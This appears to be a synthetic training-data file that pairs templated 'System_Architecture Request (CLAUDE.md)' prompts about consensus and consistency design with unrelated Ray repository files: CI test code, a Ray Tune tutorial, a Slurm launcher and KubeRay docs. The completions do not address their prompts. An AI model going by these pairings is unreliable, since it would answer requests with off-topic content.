None,\n        run_flaky_tests: bool = False,\n        cache_test_results: bool = False,\n    ) -> subprocess.Popen:\n        logger.info(\"Running tests: %s\", test_targets)\n        commands = [\n            f'cleanup() {{ chmod -R a+r \"{self.bazel_log_dir}\"; }}',\n            \"trap cleanup EXIT\",\n        ]\n        if platform.system() == \"Windows\":\n            # allow window tests to access aws services\n            commands.append(\n                \"powershell ci/pipeline/fix-windows-container-networking.ps1\"\n            )\n        if self.build_type == \"ubsan\":\n            # clang currently runs into problems with ubsan builds, this will revert to\n            # using GCC instead.\n            commands.append(\"unset CC CXX\")\n        # note that we run tests serially within each docker, since we already use\n        # multiple dockers to shard tests\n        test_cmd = \"bazel test --jobs=1 --config=ci $(./ci/run/bazel_export_options) \"\n        if self.build_type == \"debug\":\n            test_cmd += \"--config=ci-debug \"\n        if self.build_type == \"asan\":\n            test_cmd += \"--config=asan --config=asan-buildkite \"\n        if self.build_type == \"clang\":\n            test_cmd += \"--config=llvm \"\n        if self.build_type == \"asan-clang\":\n            test_cmd += \"--config=asan-clang \"\n        if self.build_type == \"ubsan\":\n            test_cmd += \"--config=ubsan \"\n        if self.build_type == \"tsan-clang\":\n            test_cmd += \"--config=tsan-clang \"\n        if self.build_type == \"cgroup\":\n            test_cmd += \"--config=cgroup \"\n        for env in test_envs:\n            test_cmd += f\"--test_env {env} \"\n        if test_arg:\n            test_cmd += f\"--test_arg {test_arg} \"\n        if cache_test_results:\n            test_cmd += \"--cache_test_results=auto \"\n        if run_flaky_tests and RUN_PER_FLAKY_TEST > 1:\n            test_cmd += f\"--runs_per_test {RUN_PER_FLAKY_TEST} \"\n        test_cmd += f\"{' '.join(test_targets)}\"\n        commands.append(test_cmd)\n        return subprocess.Popen(\n            self.get_run_command(\n                commands,\n                network=self.network,\n                gpu_ids=gpu_ids,\n                volumes=[f\"{bazel_log_dir_host}:{self.bazel_log_dir}\"],\n            )\n        )\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "ci/ray_ci/tester_container.py", "language": "python", "complexity": "complex", "star_count": 38179, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": true, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": true, "has_containers": true, "has_diagrams": false, "line_count": 276}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate class-based implementation for Design distributed system with consensus and consistency patterns for distributed system requirements\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# -*- coding: utf-8 -*-\n# flake8: noqa\n\"\"\"\nHyperparameter tuning with Ray Tune\n===================================\n\nHyperparameter tuning can make the difference between an average model and a highly\naccurate one. Often simple things like choosing a different learning rate or changing\na network layer size can have a dramatic impact on your model performance.\n\nFortunately, there are tools that help with finding the best combination of parameters.\n`Ray Tune <https://docs.ray.io/en/latest/tune.html>`_ is an industry standard tool for\ndistributed hyperparameter tuning. Ray Tune includes the latest hyperparameter search\nalgorithms, integrates with TensorBoard and other analysis libraries, and natively\nsupports distributed training through `Ray's distributed machine learning engine\n<https://ray.io/>`_.\n\nIn this tutorial, we will show you how to integrate Ray Tune into your PyTorch\ntraining workflow. We will extend `this tutorial from the PyTorch documentation\n<https://pytorch.org/tutorials/beginner/blitz/cifar10_tutorial.html>`_ for training\na CIFAR10 image classifier.\n\nAs you will see, we only need to add some slight modifications. In particular, we\nneed to\n\n1. wrap data loading and training in functions,\n2. make some network parameters configurable,\n3. add checkpointing (optional),\n4. and define the search space for the model tuning\n\n|\n\nTo run this tutorial, please make sure the following packages are\ninstalled:\n\n-  ``ray[tune]``: Distributed hyperparameter tuning library\n-  ``torchvision``: For the data transformers\n\nSetup / Imports\n---------------\nLet's start with the imports:\n\"\"\"\nfrom functools import partial\nimport os\nfrom tempfile import TemporaryDirectory\nimport torch\nimport torch.nn as nn\nimport torch.nn.functional as F\nimport torch.optim as optim\nfrom torch.utils.data import random_split\nimport torchvision\nimport torchvision.transforms as transforms\nfrom ray import train, tune\nfrom ray.train import Checkpoint\nfrom ray.tune.schedulers import ASHAScheduler\n\n######################################################################\n# Most of the imports are needed for building the PyTorch model. Only the last three\n# imports are for Ray Tune.\n#\n# Data loaders\n# ------------\n# We wrap the data loaders in their own function and pass a global data directory.\n# This way we can share a data directory between different trials.\n\n\ndef load_data(data_dir=\"./data\"):\n    transform = transforms.Compose(\n        [transforms.ToTensor(), transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5))]\n    )\n\n    trainset = torchvision.datasets.CIFAR10(\n        root=data_dir, train=True, download=True, transform=transform\n    )\n\n    testset = torchvision.datasets.CIFAR10(\n        root=data_dir, train=False, download=True, transform=transform\n    )\n\n    return trainset, testset\n\n\n######################################################################\n# Configurable neural network\n# ---------------------------\n# We can only tune those parameters that are configurable.\n# In this example, we can specify\n# the layer sizes of the fully connected layers:\n\n\nclass Net(nn.Module):\n    def __init__(self, l1=120, l2=84):\n        super(Net, self).__init__()\n        self.conv1 = nn.Conv2d(3, 6, 5)\n        self.pool = nn.MaxPool2d(2, 2)\n        self.conv2 = nn.Conv2d(6, 16, 5)\n        self.fc1 = nn.Linear(16 * 5 * 5, l1)\n        self.fc2 = nn.Linear(l1, l2)\n        self.fc3 = nn.Linear(l2, 10)\n\n    def forward(self, x):\n        x = self.pool(F.relu(self.conv1(x)))\n        x = self.pool(F.relu(self.conv2(x)))\n        x = torch.flatten(x, 1)  # flatten all dimensions except batch\n        x = F.relu(self.fc1(x))\n        x = F.relu(self.fc2(x))\n        x = self.fc3(x)\n        return x\n\n\n######################################################################\n# The train function\n# ------------------\n# Now it gets interesting, because we introduce some changes to the example `from the PyTorch\n# documentation <https://pytorch.org/tutorials/beginner/blitz/cifar10_tutorial.html>`_.\n#\n# We wrap the training script in a function ``train_cifar(config, data_dir=None)``.\n# The ``config`` parameter will receive the hyperparameters we would like to\n# train with. The ``data_dir`` specifies the directory where we load and store the data,\n# so that multiple runs can share the same data source.\n# We also load the model and optimizer state at the start of the run, if a checkpoint\n# is provided. Further down in this tutorial you will find information on how\n# to save the checkpoint and what it is used for.\n#\n# .. code-block:: python\n#\n#     net = Net(config[\"l1\"], config[\"l2\"])\n#\n#     checkpoint = train.get_checkpoint()\n#\n#     if checkpoint:\n#         checkpoint_dir = checkpoint.to_directory()\n#         checkpoint_path = os.path.join(checkpoint_dir, \"checkpoint.pt\")\n#         checkpoint_state = torch.load(checkpoint_path)\n#         start_epoch = checkpoint_state[\"epoch\"]\n#         net.load_state_dict(checkpoint_state[\"net_state_dict\"])\n#         optimizer.load_state_dict(checkpoint_state[\"optimizer_state_dict\"])\n#     else:\n#         start_epoch = 0\n#\n# The learning rate of the optimizer is made configurable, too:\n#\n# .. code-block:: python\n#\n#     optimizer = optim.SGD(net.parameters(), lr=config[\"lr\"], momentum=0.9)\n#\n# We also split the training data into a training and validation subset. We thus train on\n# 80% of the data and calculate the validation loss on the remaining 20%. The batch sizes\n# with which we iterate through the training and test sets are configurable as well.\n#\n# Adding (multi) GPU support with DataParallel\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n# Image classification benefits largely from GPUs. Luckily, we can continue to use\n# PyTorch's abstractions in Ray Tune. Thus, we can wrap our model in ``nn.DataParallel``\n# to support data parallel training on multiple GPUs:\n#\n# .. code-block:: python\n#\n#     device = \"cpu\"\n#     if torch.cuda.is_available():\n#         device = \"cuda:0\"\n#         if torch.cuda.device_count() > 1:\n#             net = nn.DataParallel(net)\n#     net.to(device)\n#\n# By using a ``device`` variable we make sure that training also works when we have\n# no GPUs available. PyTorch requires us to send our data to the GPU memory explicitly,\n# like this:\n#\n# .. code-block:: python\n#\n#     for i, data in enumerate(trainloader, 0):\n#         inputs, labels = data\n#         inputs, labels = inputs.to(device), labels.to(device)\n#\n# The code now supports training on CPUs, on a single GPU, and on multiple GPUs. Notably, Ray\n# also supports `fractional GPUs <https://docs.ray.io/en/master/using-ray-with-gpus.html#fractional-gpus>`_\n# so we can share GPUs among trials, as long as the model still fits on the GPU memory. We'll come back\n# to that later.\n#\n# Communicating with Ray Tune\n# ~~~~~~~~~~~~~~~~~~~~~~~~~~~\n#\n# The most interesting part is the communication with Ray Tune:\n#\n# .. code-block:: python\n\n#     checkpoint_data = {\n#         \"epoch\": epoch,\n#         \"net_state_dict\": net.state_dict(),\n#         \"optimizer_state_dict\": optimizer.state_dict(),\n#     }\n\n#     with TemporaryDirectory() as tmpdir:\n#         torch.save(checkpoint_data, os.path.join(tmpdir, \"checkpoint.pt\"))\n    \n#         train.report(\n#             {\"loss\": val_loss / val_steps, \"accuracy\": correct / total},\n#             checkpoint=Checkpoint.from_directory(tmpdir),\n#         )\n#\n# Here we first save a checkpoint and then report some metrics back to Ray Tune. Specifically,\n# we send the validation loss and accuracy back to Ray Tune. Ray Tune can then use these metrics\n# to decide which hyperparameter configuration lead to the best results. These metrics\n# can also be used to stop bad performing trials early in order to avoid wasting\n# resources on those trials.\n#\n# The checkpoint saving is optional, however, it is necessary if we wanted to use advanced\n# schedulers like\n# `Population Based Training <https://docs.ray.io/en/master/tune/tutorials/tune-advanced-tutorial.html>`_.\n# Also, by saving the checkpoint we can later load the trained models and validate them\n# on a test set. Lastly, saving checkpoints is useful for fault tolerance, and it allows\n# us to interrupt training and continue training later.\n#\n# Full training function\n# ~~~~~~~~~~~~~~~~~~~~~~\n#\n# The full code example looks like this:\n\n\ndef train_cifar(config, data_dir=None):\n    net = Net(config[\"l1\"], config[\"l2\"])\n\n    device = \"cpu\"\n    if torch.cuda.is_available():\n        device = \"cuda:0\"\n        if torch.cuda.device_count() > 1:\n            net = nn.DataParallel(net)\n    net.to(device)\n\n    criterion = nn.CrossEntropyLoss()\n    optimizer = optim.SGD(net.parameters(), lr=config[\"lr\"], momentum=0.9)\n\n    checkpoint = train.get_checkpoint()\n\n    if checkpoint:\n        checkpoint_dir = checkpoint.to_directory()\n        checkpoint_path = os.path.join(checkpoint_dir, \"checkpoint.pt\")\n        checkpoint_state = torch.load(checkpoint_path)\n        start_epoch = checkpoint_state[\"epoch\"]\n        net.load_state_dict(checkpoint_state[\"net_state_dict\"])\n        optimizer.load_state_dict(checkpoint_state[\"optimizer_state_dict\"])\n    else:\n        start_epoch = 0\n\n    trainset, testset = load_data(data_dir)\n\n    test_abs = int(len(trainset) * 0.8)\n    train_subset, val_subset = random_split(\n        trainset, [test_abs, len(trainset) - test_abs]\n    )\n\n    trainloader = torch.utils.data.DataLoader(\n        train_subset, batch_size=int(config[\"batch_size\"]), shuffle=True, num_workers=8\n    )\n    valloader = torch.utils.data.DataLoader(\n        val_subset, batch_size=int(config[\"batch_size\"]), shuffle=True, num_workers=8\n    )\n\n    for epoch in range(start_epoch, 10):  # loop over the dataset multiple times\n        running_loss = 0.0\n        epoch_steps = 0\n        for i, data in enumerate(trainloader, 0):\n            # get the inputs; data is a list of [inputs, labels]\n            inputs, labels = data\n            inputs, labels = inputs.to(device), labels.to(device)\n\n            # zero the parameter gradients\n            optimizer.zero_grad()\n\n            # forward + backward + optimize\n            outputs = net(inputs)\n            loss = criterion(outputs, labels)\n            loss.backward()\n            optimizer.step()\n\n            # print statistics\n            running_loss += loss.item()\n            epoch_steps += 1\n            if i % 2000 == 1999:  # print every 2000 mini-batches\n                print(\n                    \"[%d, %5d] loss: %.3f\"\n                    % (epoch + 1, i + 1, running_loss / epoch_steps)\n                )\n                running_loss = 0.0\n\n        # Validation loss\n        val_loss = 0.0\n        val_steps = 0\n        total = 0\n        correct = 0\n        for i, data in enumerate(valloader, 0):\n            with torch.no_grad():\n                inputs, labels = data\n                inputs, labels = inputs.to(device), labels.to(device)\n\n                outputs = net(inputs)\n                _, predicted = torch.max(outputs.data, 1)\n                total += labels.size(0)\n                correct += (predicted == labels).sum().item()\n\n                loss = criterion(outputs, labels)\n                val_loss += loss.cpu().numpy()\n                val_steps += 1\n\n        checkpoint_data = {\n            \"epoch\": epoch,\n            \"net_state_dict\": net.state_dict(),\n            \"optimizer_state_dict\": optimizer.state_dict(),\n        }\n        with TemporaryDirectory() as tmpdir:\n            torch.save(checkpoint_data, os.path.join(tmpdir, \"checkpoint.pt\"))\n            train.report(\n                {\"loss\": val_loss / val_steps, \"accuracy\": correct / total},\n                checkpoint=Checkpoint.from_directory(tmpdir),\n            )\n    print(\"Finished Training\")\n\n\n######################################################################\n# As you can see, most of the code is adapted directly from the original example.\n#\n# Test set accuracy\n# -----------------\n# Commonly the performance of a machine learning model is tested on a hold-out test\n# set with data that has not been used for training the model. We also wrap this in a\n# function:\n\n\ndef test_accuracy(net, device=\"cpu\"):\n    trainset, testset = load_data()\n\n    testloader = torch.utils.data.DataLoader(\n        testset, batch_size=4, shuffle=False, num_workers=2\n    )\n\n    correct = 0\n    total = 0\n    with torch.no_grad():\n        for data in testloader:\n            images, labels = data\n            images, labels = images.to(device), labels.to(device)\n            outputs = net(images)\n            _, predicted = torch.max(outputs.data, 1)\n            total += labels.size(0)\n            correct += (predicted == labels).sum().item()\n\n    return correct / total\n\n\n######################################################################\n# The function also expects a ``device`` parameter, so we can do the\n# test set validation on a GPU.\n#\n# Configuring the search space\n# ----------------------------\n# Lastly, we need to define Ray Tune's search space. Here is an example:\n#\n# .. code-block:: python\n#\n#     config = {\n#         \"l1\": tune.choice([2 ** i for i in range(9)]),\n#         \"l2\": tune.choice([2 ** i for i in range(9)]),\n#         \"lr\": tune.loguniform(1e-4, 1e-1),\n#         \"batch_size\": tune.choice([2, 4, 8, 16])\n#     }\n#\n# The ``tune.choice()`` accepts a list of values that are uniformly sampled from.\n# In this example, the ``l1`` and ``l2`` parameters\n# should be powers of 2 between 4 and 256, so either 4, 8, 16, 32, 64, 128, or 256.\n# The ``lr`` (learning rate) should be uniformly sampled between 0.0001 and 0.1. Lastly,\n# the batch size is a choice between 2, 4, 8, and 16.\n#\n# At each trial, Ray Tune will now randomly sample a combination of parameters from these\n# search spaces. It will then train a number of models in parallel and find the best\n# performing one among these. We also use the ``ASHAScheduler`` which will terminate bad\n# performing trials early.\n#\n# We wrap the ``train_cifar`` function with ``functools.partial`` to set the constant\n# ``data_dir`` parameter. We can also tell Ray Tune what resources should be\n# available for each trial:\n#\n# .. code-block:: python\n#\n#     gpus_per_trial = 2\n#     # ...\n#     result = tune.run(\n#         partial(train_cifar, data_dir=data_dir),\n#         resources_per_trial={\"cpu\": 8, \"gpu\": gpus_per_trial},\n#         config=config,\n#         num_samples=num_samples,\n#         scheduler=scheduler,\n#         checkpoint_at_end=True)\n#\n# You can specify the number of CPUs, which are then available e.g.\n# to increase the ``num_workers`` of the PyTorch ``DataLoader`` instances. The selected\n# number of GPUs are made visible to PyTorch in each trial. Trials do not have access to\n# GPUs that haven't been requested for them - so you don't have to care about two trials\n# using the same set of resources.\n#\n# Here we can also specify fractional GPUs, so something like ``gpus_per_trial=0.5`` is\n# completely valid. The trials will then share GPUs among each other.\n# You just have to make sure that the models still fit in the GPU memory.\n#\n# After training the models, we will find the best performing one and load the trained\n# network from the checkpoint file. We then obtain the test set accuracy and report\n# everything by printing.\n#\n# The full main function looks like this:\n\n\ndef main(num_samples=10, max_num_epochs=10, gpus_per_trial=2):\n    data_dir = os.path.abspath(\"./data\")\n    load_data(data_dir)\n    config = {\n        \"l1\": tune.choice([2**i for i in range(9)]),\n        \"l2\": tune.choice([2**i for i in range(9)]),\n        \"lr\": tune.loguniform(1e-4, 1e-1),\n        \"batch_size\": tune.choice([2, 4, 8, 16]),\n    }\n    scheduler = ASHAScheduler(\n        metric=\"loss\",\n        mode=\"min\",\n        max_t=max_num_epochs,\n        grace_period=1,\n        reduction_factor=2,\n    )\n    result = tune.run(\n        partial(train_cifar, data_dir=data_dir),\n        resources_per_trial={\"cpu\": 2, \"gpu\": gpus_per_trial},\n        config=config,\n        num_samples=num_samples,\n        scheduler=scheduler,\n    )\n\n    best_trial = result.get_best_trial(\"loss\", \"min\", \"last\")\n    print(f\"Best trial config: {best_trial.config}\")\n    print(f\"Best trial final validation loss: {best_trial.last_result['loss']}\")\n    print(f\"Best trial final validation accuracy: {best_trial.last_result['accuracy']}\")\n\n    best_trained_model = Net(best_trial.config[\"l1\"], best_trial.config[\"l2\"])\n    device = \"cpu\"\n    if torch.cuda.is_available():\n        device = \"cuda:0\"\n        if gpus_per_trial > 1:\n            best_trained_model = nn.DataParallel(best_trained_model)\n    best_trained_model.to(device)\n\n    best_checkpoint = best_trial.checkpoint\n    best_checkpoint_dir = best_checkpoint.to_directory()\n    best_checkpoint_path = os.path.join(best_checkpoint_dir, \"checkpoint.pt\")\n    best_checkpoint_data = torch.load(best_checkpoint_path)\n\n    best_trained_model.load_state_dict(best_checkpoint_data[\"net_state_dict\"])\n\n    test_acc = test_accuracy(best_trained_model, device)\n    print(\"Best trial test set accuracy: {}\".format(test_acc))\n\n\nif __name__ == \"__main__\":\n    # sphinx_gallery_start_ignore\n    # Fixes ``AttributeError: '_LoggingTee' object has no attribute 'fileno'``.\n    # This is only needed to run with sphinx-build.\n    import sys\n\n    sys.stdout.fileno = lambda: False\n    # sphinx_gallery_end_ignore\n    # You can change the number of GPUs per trial here:\n    main(num_samples=10, max_num_epochs=10, gpus_per_trial=0)\n\n\n######################################################################\n# If you run the code, an example output could look like this:\n#\n# ::\n#\n#     Number of trials: 10/10 (10 TERMINATED)\n#     +-----+--------------+------+------+-------------+--------+---------+------------+\n#     | ... |   batch_size |   l1 |   l2 |          lr |   iter |    loss |   accuracy |\n#     |-----+--------------+------+------+-------------+--------+---------+------------|\n#     | ... |            2 |    1 |  256 | 0.000668163 |      1 | 2.31479 |     0.0977 |\n#     | ... |            4 |   64 |    8 | 0.0331514   |      1 | 2.31605 |     0.0983 |\n#     | ... |            4 |    2 |    1 | 0.000150295 |      1 | 2.30755 |     0.1023 |\n#     | ... |           16 |   32 |   32 | 0.0128248   |     10 | 1.66912 |     0.4391 |\n#     | ... |            4 |    8 |  128 | 0.00464561  |      2 | 1.7316  |     0.3463 |\n#     | ... |            8 |  256 |    8 | 0.00031556  |      1 | 2.19409 |     0.1736 |\n#     | ... |            4 |   16 |  256 | 0.00574329  |      2 | 1.85679 |     0.3368 |\n#     | ... |            8 |    2 |    2 | 0.00325652  |      1 | 2.30272 |     0.0984 |\n#     | ... |            2 |    2 |    2 | 0.000342987 |      2 | 1.76044 |     0.292  |\n#     | ... |            4 |   64 |   32 | 0.003734    |      8 | 1.53101 |     0.4761 |\n#     +-----+--------------+------+------+-------------+--------+---------+------------+\n#\n#     Best trial config: {'l1': 64, 'l2': 32, 'lr': 0.0037339984519545164, 'batch_size': 4}\n#     Best trial final validation loss: 1.5310075663924216\n#     Best trial final validation accuracy: 0.4761\n#     Best trial test set accuracy: 0.4737\n#\n# Most trials have been stopped early in order to avoid wasting resources.\n# The best performing trial achieved a validation accuracy of about 47%, which could\n# be confirmed on the test set.\n#\n# So that's it! You can now tune the parameters of your PyTorch models.\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/external/pytorch_tutorials_hyperparameter_tuning_tutorial.py", "language": "python", "complexity": "complex", "star_count": 38179, "quality_score": 1.0, "features": {"has_microservices": false, "has_api_design": true, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 503}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate module integration for Design distributed system with consensus and consistency patterns\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "# slurm-launch.py\n# Usage:\n# python slurm-launch.py --exp-name test \\\n#     --command \"rllib train --run PPO --env CartPole-v0\"\n\nimport argparse\nimport subprocess\nimport sys\nimport time\nfrom pathlib import Path\n\ntemplate_file = Path(__file__) / \"slurm-template.sh\"\nJOB_NAME = \"${JOB_NAME}\"\nNUM_NODES = \"${NUM_NODES}\"\nNUM_GPUS_PER_NODE = \"${NUM_GPUS_PER_NODE}\"\nPARTITION_OPTION = \"${PARTITION_OPTION}\"\nCOMMAND_PLACEHOLDER = \"${COMMAND_PLACEHOLDER}\"\nGIVEN_NODE = \"${GIVEN_NODE}\"\nLOAD_ENV = \"${LOAD_ENV}\"\n\nif __name__ == \"__main__\":\n    parser = argparse.ArgumentParser()\n    parser.add_argument(\n        \"--exp-name\",\n        type=str,\n        required=True,\n        help=\"The job name and path to logging file (exp_name.log).\",\n    )\n    parser.add_argument(\n        \"--num-nodes\", \"-n\", type=int, default=1, help=\"Number of nodes to use.\"\n    )\n    parser.add_argument(\n        \"--node\",\n        \"-w\",\n        type=str,\n        help=\"The specified nodes to use. Same format as the \"\n        \"return of 'sinfo'. Default: ''.\",\n    )\n    parser.add_argument(\n        \"--num-gpus\",\n        type=int,\n        default=0,\n        help=\"Number of GPUs to use in each node. (Default: 0)\",\n    )\n    parser.add_argument(\n        \"--partition\",\n        \"-p\",\n        type=str,\n    )\n    parser.add_argument(\n        \"--load-env\",\n        type=str,\n        help=\"The script to load your environment ('module load cuda/10.1')\",\n        default=\"\",\n    )\n    parser.add_argument(\n        \"--command\",\n        type=str,\n        required=True,\n        help=\"The command you wish to execute. For example: \"\n        \" --command 'python test.py'. \"\n        \"Note that the command must be a string.\",\n    )\n    args = parser.parse_args()\n\n    if args.node:\n        # assert args.num_nodes == 1\n        node_info = \"#SBATCH -w {}\".format(args.node)\n    else:\n        node_info = \"\"\n\n    job_name = \"{}_{}\".format(\n        args.exp_name, time.strftime(\"%m%d-%H%M\", time.localtime())\n    )\n\n    partition_option = (\n        \"#SBATCH --partition={}\".format(args.partition) if args.partition else \"\"\n    )\n\n    # ===== Modified the template script =====\n    with open(template_file, \"r\") as f:\n        text = f.read()\n    text = text.replace(JOB_NAME, job_name)\n    text = text.replace(NUM_NODES, str(args.num_nodes))\n    text = text.replace(NUM_GPUS_PER_NODE, str(args.num_gpus))\n    text = text.replace(PARTITION_OPTION, partition_option)\n    text = text.replace(COMMAND_PLACEHOLDER, str(args.command))\n    text = text.replace(LOAD_ENV, str(args.load_env))\n    text = text.replace(GIVEN_NODE, node_info)\n    text = text.replace(\n        \"# THIS FILE IS A TEMPLATE AND IT SHOULD NOT BE DEPLOYED TO PRODUCTION!\",\n        \"# THIS FILE IS MODIFIED AUTOMATICALLY FROM TEMPLATE AND SHOULD BE \"\n        \"RUNNABLE!\",\n    )\n\n    # ===== Save the script =====\n    script_file = \"{}.sh\".format(job_name)\n    with open(script_file, \"w\") as f:\n        f.write(text)\n\n    # ===== Submit the job =====\n    print(\"Starting to submit job!\")\n    subprocess.Popen([\"sbatch\", script_file])\n    print(\n        \"Job submitted! Script file is at: <{}>. Log file is at: <{}>\".format(\n            script_file, \"{}.log\".format(job_name)\n        )\n    )\n    sys.exit(0)\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/doc_code/slurm-launch.py", "language": "python", "complexity": "medium", "star_count": 38179, "quality_score": 0.92, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": true, "has_scaling": false, "has_cloud_patterns": false, "has_containers": false, "has_diagrams": false, "line_count": 110}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-examples)=\n\n# Examples\n\n```{toctree}\n:hidden:\n\nexamples/mnist-training-example\nexamples/stable-diffusion-rayservice\nexamples/tpu-serve-stable-diffusion\nexamples/mobilenet-rayservice\nexamples/text-summarizer-rayservice\nexamples/rayjob-batch-inference-example\nexamples/rayjob-kueue-priority-scheduling\nexamples/rayjob-kueue-gang-scheduling\nexamples/distributed-checkpointing-with-gcsfuse\nexamples/modin-example\nexamples/rayserve-llm-example\nexamples/verl-post-training\n```\n\n\nThis section presents example Ray workloads to try out on your Kubernetes cluster.\n\n- {ref}`kuberay-mnist-training-example` (CPU-only)\n- {ref}`kuberay-mobilenet-rayservice-example` (CPU-only)\n- {ref}`kuberay-stable-diffusion-rayservice-example`\n- {ref}`kuberay-tpu-stable-diffusion-example`\n- {ref}`kuberay-text-summarizer-rayservice-example`\n- {ref}`kuberay-batch-inference-example`\n- {ref}`kuberay-kueue-priority-scheduling-example`\n- {ref}`kuberay-kueue-gang-scheduling-example`\n- {ref}`kuberay-distributed-checkpointing-gcsefuse`\n- {ref}`kuberay-modin-example`\n- {ref}`kuberay-rayservice-llm-example`\n- {ref}`kuberay-verl`\n", "metadata": {"source": "github.com/ray-project/ray", "file_path": "doc/source/cluster/kubernetes/examples.md", "language": "markdown", "complexity": "simple", "star_count": 38179, "quality_score": 0.8, "features": {"has_microservices": false, "has_api_design": false, "has_load_balancing": false, "has_caching": false, "has_database_design": false, "has_security": false, "has_monitoring": false, "has_scaling": false, "has_cloud_patterns": false, "has_containers": true, "has_diagrams": false, "line_count": 37}, "authority_level": "high", "authentic": true}}
{"domain": "system_architecture", "category": "distributed_systems", "prompt": "### System_Architecture Request (CLAUDE.md):\nCreate configuration for Design distributed system with consensus and consistency patterns with containerized deployment\n\n### EXPLORE Phase:\nAnalyze requirements and existing patterns.\n\n### PLAN Phase:\nDesign implementation approach and structure.\n\n### CODE Phase:", "completion": "(kuberay-distributed-checkpointing-gcsefuse)=\n\n# Distributed checkpointing with KubeRay and GCSFuse\n\nThis example orchestrates distributed checkpointing with KubeRay, using the GCSFuse CSI driver and Google Cloud Storage as the remote storage system.\nTo illustrate the concepts, this guide uses the [Finetuning a Pytorch Image Classifier with Ray Train](https://docs.ray.io/en/latest/train/examples/pytorch/pytorch_resnet_finetune.html) example.\n\n## Why distributed checkpointing with GCSFuse?\n\nIn large-scale, high-performance machine learning, distributed checkpointing is crucial for fault tolerance, ensuring that if a node fails during training, Ray can resume the process from the latest saved checkpoint instead of starting from scratch.\nWhile it's possible to directly reference remote storage paths (e.g., `gs://my-checkpoint-bucket`), using Google Cloud Storage FUSE (GCSFuse) has distinct advantages for distributed applications. GCSFuse allows you to mount Cloud Storage buckets like local file systems, making checkpoint management more intuitive for distributed applications that rely on these semantics. Furthermore, GCSFuse is designed for high-performance workloads, delivering the performance and scalability you need for distributed checkpointing of large models.\n\n[Distributed checkpointing](https://docs.ray.io/en/latest/train/user-guides/checkpoints.html), in combination with [GCSFuse](https://cloud.google.com/storage/docs/gcs-fuse), allows for larger-scale model training with increased availability and efficiency.\n\n## Create a Kubernetes cluster on GKE\n\nCreate a GKE cluster with the [GCSFuse CSI driver](https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/cloud-storage-fuse-csi-driver) and [Workload Identity](https://cloud.google.com/kubernetes-engine/docs/how-to/workload-identity) enabled, as well as a GPU node pool with 4 L4 GPUs:\n```\nexport PROJECT_ID=<your project id>\ngcloud container clusters create kuberay-with-gcsfuse \\\n    --addons GcsFuseCsiDriver \\\n    --cluster-version=1.29.4 \\\n    --location=us-east4-c \\\n    --machine-type=g2-standard-8 \\\n    --release-channel=rapid \\\n    --num-nodes=4 \\\n    --accelerator type=nvidia-l4,count=1,gpu-driver-version=latest \\\n    --workload-pool=${PROJECT_ID}.svc.id.goog\n```\n\nVerify the successful creation of your cluster with 4 GPUs:\n```\n$ kubectl get nodes \"-o=custom-columns=NAME:.metadata.name,GPU:.status.allocatable.nvidia\\.com/gpu\"\nNAME                                                  GPU\ngke-kuberay-with-gcsfuse-default-pool-xxxx-0000       1\ngke-kuberay-with-gcsfuse-default-pool-xxxx-1111       1\ngke-kuberay-with-gcsfuse-default-pool-xxxx-2222       1\ngke-kuberay-with-gcsfuse-default-pool-xxxx-3333       1\n```\n\n## Install the KubeRay operator\n\nFollow [Deploy a KubeRay operator](kuberay-operator-deploy) to install the latest stable KubeRay operator from the Helm repository.\nThe KubeRay operator Pod must be on the CPU node if you set up the taint for the GPU node pool correctly.\n\n## Configuring the GCS Bucket\n\nCreate a GCS bucket that Ray uses as the remote filesystem.\n```\nBUCKET=<your GCS bucket>\ngcloud storage buckets create gs://$BUCKET --uniform-bucket-level-access\n```\n\nCreate a Kubernetes ServiceAccount that grants the RayCluster access to mount the GCS bucket:\n```\nkubectl create serviceaccount pytorch-distributed-training\n```\n\nBind the `roles/storage.objectUser` role to the Kubernetes service account and bucket IAM policy.\nSee [Identifying projects](https://cloud.google.com/resource-manager/docs/creating-managing-projects#identifying_projects) to find your project ID and project number:\n```\nPROJECT_ID=<your project ID>\nPROJECT_NUMBER=<your project number>\ngcloud storage buckets add-iam-policy-binding gs://${BUCKET} --member \"principal://iam.googleapis.com/projects/${PROJECT_NUMBER}/locations/global/workloadIdentityPools/${PROJECT_ID}.svc.id.goog/subject/ns/default/sa/pytorch-distributed-training\"  --role \"roles/storage.objectUser\"\n```\n\nSee [Access Cloud Storage buckets with the Cloud Storage FUSE CSI driver](https://cloud.google.com/kubernetes-engine/docs/how-to/persistent-volumes/cloud-storage-fuse-csi-driver) for more details.\n\n## Deploy the RayJob\n\nDownload the RayJob that executes all the steps documented in [Finetuning a Pytorch Image Classifier with Ray Train](https://docs.ray.io/en/latest/train/examples/pytorch/pytorch_resnet_finetune.html). The [source 